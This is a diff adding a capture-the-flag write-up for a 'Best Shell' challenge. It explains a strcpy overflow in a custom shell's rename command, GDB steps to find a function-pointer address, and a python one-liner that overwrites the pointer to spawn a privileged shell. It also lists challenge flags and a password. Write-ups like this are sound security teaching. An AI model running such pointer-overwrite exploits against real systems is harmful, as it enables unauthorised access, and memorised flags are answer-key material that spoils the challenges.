@@ -632,6 +632,39 @@ password: youllneverguessthispassword
 
 Funny thing is that already guessed it after 4 characters. Just use this password to log in and you get the flag: whereof_one_cannot_speak_thereof_one_must_be_silent
 -------------------------------
+Best Shell - 160
+
+We get the source code for a custom shell and have to use it to spawn a priviliged one to read the flag.
+
+The functions main and setup_handkers aren't really important, because they only gets executed once, before we get a chance to interact with them, so even if there were bugs, we wouldn't be able to exploit them. All they do is read the password, set up the handlers, and call input_loop.
+
+Function input_loop is important, but not exploitable. It keeps on reading 127 bytes from stdin, splits up the string in cmd and arg, and attempt to call the appropriate function. It's not possible to cause a buffer overflow here, because any input larger than 127 bytes just gets split up into several inputs. Interesting here too, is that no input causes a SEGFAULT (which could be useful for core dumping).
+
+The function shell_handler is where the action happens. It checks if the user is authenticated as admin before spawning a shell. If the user isn't authenticated, it only prints a string. The goal is to get inside the if-clause. If only we could find a way to change the function pointers in the handlers to point there...
+
+This leads us to the rename command, that allows us to rename any command. As we can see at the top, each command is up to 32 bytes long. In line 84, we see a simple strcpy, that doesn't check the length of the input (which could be up to 127-6-1-3-1=116 bytes). This command allows us to overwrite a function pointer with a random value, meaning we can jump to any address we want.
+
+The simplest solution is, of course, to change the address, so we jump inside the if-clause in the shell_handler function.
+
+Here's what I did in GDB:
+(gdb) disas input_loop			# find a breakpoint (0x08048c7d)
+(gdb) break *0x08048c7d			# break right before reading input from stdin in input_loop
+(gdb) run 						# start the program
+(gdb) print &handlers			# get the address of handlers (0x804b0e0)
+(gdb) x/32xw 0x804b0e0			# examine memory at handlers 
+								# shell func pointer points to 0x080489c6
+(gdb) disas 0x080489c6			# disassemble shell_handler function
+								# target address is 0x080489d7 (call to getuid)
+
+So if we're going to overwrite the shell command/function pointer, this is what the new name should be: 
+<32 a's><new function pointer>auth
+
+We'll need to use python to generate the input. First we'll execute the rename command, then call that new command, and we musn't forget to keep stdin open:
+cat <(python -c 'print "rename shell "+"a"*32+"\xd7\x89\x04\x08"+"auth"') <(python -c 'print "a"*32+"\xd7\x89\x04\x08"+"auth"') - | ./best_shell
+
+Executing that command will spawn a shell, and we can cat the flag file.
+
+FLAG: give_shell_was_useful
 -------------------------------
 -------------------------------
 -------------------------------
